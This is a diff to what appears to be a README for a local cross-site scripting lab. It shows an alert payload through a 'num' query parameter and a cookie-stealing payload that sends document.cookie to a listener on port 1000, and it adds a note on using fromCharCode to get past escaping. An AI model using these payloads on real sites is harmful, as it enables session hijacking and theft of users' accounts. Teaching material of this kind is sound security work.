@@ -51,7 +51,7 @@ the page. If you want to clear the database, just delete the `database.db` file 
 * Key in `http://localhost:5000/?num=alert(123)` into the address bar
 * An alert for 123 will appear as an alert
 
-In order to do something similar to the above, we cannot directly, insert `window.location=document.location='http://127.0.0.1:1000/?c='+document.cookie;` into the address bar after the query as some characters might be escaped
+In order to do something similar to the above, we cannot directly, insert `window.location=document.location='http://127.0.0.1:1000/?c='+document.cookie;` into the address bar after the query as some characters might be escaped. The javascript in the DOM only has access to the raw escaped query string and not the unescaped string. Thus, another method is required.
 
 In this case the `toString().constructor.fromCharCode` will be our best friend
 * Make sure both servers are up
